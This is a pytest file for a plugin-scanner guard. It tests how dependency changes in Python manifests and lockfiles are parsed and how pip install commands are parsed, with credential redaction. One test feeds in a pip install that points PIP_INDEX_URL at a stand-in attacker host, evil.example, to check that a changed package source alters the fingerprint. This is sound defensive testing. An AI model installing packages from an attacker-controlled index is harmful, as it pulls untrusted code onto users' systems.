"""Phase 12 Python manifest and lockfile parsing tests."""

from __future__ import annotations

from codex_plugin_scanner.guard.runtime.package_intent import (
    parse_manifest_dependency_changes,
    parse_package_intent,
)
from codex_plugin_scanner.guard.runtime.package_intent_common import build_package_request_artifact


def _change_map(path: str, before_text: str, after_text: str) -> dict[str, tuple[str | None, str | None]]:
    result = parse_manifest_dependency_changes(path=path, before_text=before_text, after_text=after_text)
    return {change.package_name: (change.before, change.after) for change in result.changes}


def test_parse_manifest_dependency_changes_supports_python_requirements_hashes_markers_and_comments() -> None:
    before = """
# base dependencies
-r base.txt
-c constraints.txt
flask[async]==3.0.0 --hash=sha256:aaaaaaaa
"""
    after = """
# base dependencies
-r base.txt
-c constraints.txt
flask[async]==3.0.1 --hash=sha256:bbbbbbbb
httpx>=0.27 ; python_version >= "3.10"
"""

    changes = _change_map("requirements.txt", before, after)

    assert changes["flask"] == ("3.0.0", "3.0.1")
    assert changes["httpx"] == (None, '>=0.27 ; python_version >= "3.10"')
    assert set(changes) == {"flask", "httpx"}


def test_parse_manifest_dependency_changes_supports_python_requirements_line_continuations() -> None:
    before = """
requests==2.31.0 \\
    --hash=sha256:aaaaaaaa
"""
    after = """
requests==2.32.0 \\
    --hash=sha256:bbbbbbbb
"""

    changes = _change_map("requirements.txt", before, after)

    assert changes["requests"] == ("2.31.0", "2.32.0")


def test_parse_manifest_dependency_changes_supports_pyproject_optional_dependencies() -> None:
    before = """
[project]
dependencies = ["fastapi>=0.110,<0.115"]

[project.optional-dependencies]
dev = ["pytest>=8.0"]
"""
    after = """
[project]
dependencies = ["fastapi>=0.110,<0.116", "httpx>=0.27"]

[project.optional-dependencies]
dev = ["pytest>=8.1"]
docs = ["mkdocs>=1.6"]
"""

    changes = _change_map("pyproject.toml", before, after)

    assert changes["fastapi"] == (">=0.110,<0.115", ">=0.110,<0.116")
    assert changes["httpx"] == (None, ">=0.27")
    assert changes["pytest"] == (">=8.0", ">=8.1")
    assert changes["mkdocs"] == (None, ">=1.6")


def test_parse_manifest_dependency_changes_supports_poetry_lock_packages() -> None:
    before = """
[[package]]
name = "requests"
version = "2.31.0"
groups = ["main"]

[[package]]
name = "pytest"
version = "8.1.0"
groups = ["dev"]
"""
    after = """
[[package]]
name = "requests"
version = "2.32.0"
groups = ["main"]

[[package]]
name = "pytest"
version = "8.1.1"
groups = ["dev"]

[[package]]
name = "httpx"
version = "0.27.0"
groups = ["main"]
"""

    changes = _change_map("poetry.lock", before, after)

    assert changes["requests"] == ("2.31.0", "2.32.0")
    assert changes["pytest"] == ("8.1.0", "8.1.1")
    assert changes["httpx"] == (None, "0.27.0")


def test_parse_manifest_dependency_changes_supports_uv_lock_packages() -> None:
    before = """
version = 1

[[package]]
name = "fastapi"
version = "0.115.0"
source = { registry = "https://pypi.org/simple" }
"""
    after = """
version = 1

[[package]]
name = "fastapi"
version = "0.115.1"
source = { registry = "https://pypi.org/simple" }

[[package]]
name = "httpx"
version = "0.27.0"
source = { registry = "https://pypi.org/simple" }
"""

    changes = _change_map("uv.lock", before, after)

    assert changes["fastapi"] == ("0.115.0", "0.115.1")
    assert changes["httpx"] == (None, "0.27.0")


def test_parse_manifest_dependency_changes_supports_pipfile_lock_default_and_develop() -> None:
    before = """
{"default":{"flask":{"version":"==3.0.0"}},"develop":{"pytest":{"version":"==8.1.0"}}}
"""
    after = """
{"default":{"flask":{"version":"==3.0.1"},"httpx":{"version":"==0.27.0"}},"develop":{"pytest":{"version":"==8.1.1"}}}
"""

    changes = _change_map("Pipfile.lock", before, after)

    assert changes["flask"] == ("3.0.0", "3.0.1")
    assert changes["httpx"] == (None, "0.27.0")
    assert changes["pytest"] == ("8.1.0", "8.1.1")


def test_parse_package_intent_redacts_pip_index_credentials_from_flag_values() -> None:
    intent = parse_package_intent(
        "pip install --index-url=https://user:secret@example.com/simple "
        "--extra-index-url=https://token@mirror.example/simple requests==2.31.0"
    )

    assert intent is not None
    assert "user:secret@" not in intent.redacted_command
    assert "token@" not in intent.redacted_command
    assert "--index-url=https://example.com/simple" in intent.redacted_command
    assert "--extra-index-url=https://mirror.example/simple" in intent.redacted_command


def test_parse_package_intent_redacts_pip_index_credentials_from_env_assignments() -> None:
    intent = parse_package_intent("PIP_INDEX_URL=https://user:secret@example.com/simple pip install requests==2.31.0")
    wrapped_intent = parse_package_intent(
        "env PIP_INDEX_URL=https://user:secret@example.com/simple pip install requests==2.31.0"
    )

    assert intent is not None
    assert "user:secret@" not in intent.redacted_command
    assert "PIP_INDEX_URL=https://example.com/simple" in intent.redacted_command
    assert intent.redacted_command.endswith("pip install requests==2.31.0")
    assert wrapped_intent is not None
    assert "user:secret@" not in wrapped_intent.redacted_command
    assert "PIP_INDEX_URL=https://example.com/simple" in wrapped_intent.redacted_command
    assert wrapped_intent.redacted_command.endswith("pip install requests==2.31.0")


def test_parse_package_intent_package_source_env_changes_fingerprint() -> None:
    benign_intent = parse_package_intent("pip install requests==2.31.0")
    source_intent = parse_package_intent(
        "PIP_INDEX_URL=https://user:secret@evil.example/simple pip install requests==2.31.0"
    )
    unrelated_env_intent = parse_package_intent("API_TOKEN=supersecret pip install requests==2.31.0")

    assert benign_intent is not None
    assert source_intent is not None
    assert unrelated_env_intent is not None
    assert "user:secret@" not in source_intent.redacted_command
    assert "PIP_INDEX_URL=https://evil.example/simple" in source_intent.redacted_command
    assert unrelated_env_intent.redacted_command == benign_intent.redacted_command

    benign_artifact = build_package_request_artifact(
        "codex",
        benign_intent,
        config_path="guard.toml",
        source_scope="project",
    )
    source_artifact = build_package_request_artifact(
        "codex",
        source_intent,
        config_path="guard.toml",
        source_scope="project",
    )
    unrelated_env_artifact = build_package_request_artifact(
        "codex",
        unrelated_env_intent,
        config_path="guard.toml",
        source_scope="project",
    )

    assert source_artifact.artifact_id != benign_artifact.artifact_id
    assert unrelated_env_artifact.artifact_id == benign_artifact.artifact_id


def test_parse_package_intent_strips_non_url_env_assignments_from_redacted_command() -> None:
    intent = parse_package_intent("API_TOKEN=supersecret pip install requests==2.31.0")

    assert intent is not None
    assert "API_TOKEN" not in intent.redacted_command
    assert "supersecret" not in intent.redacted_command
    assert intent.redacted_command == "pip install requests==2.31.0"
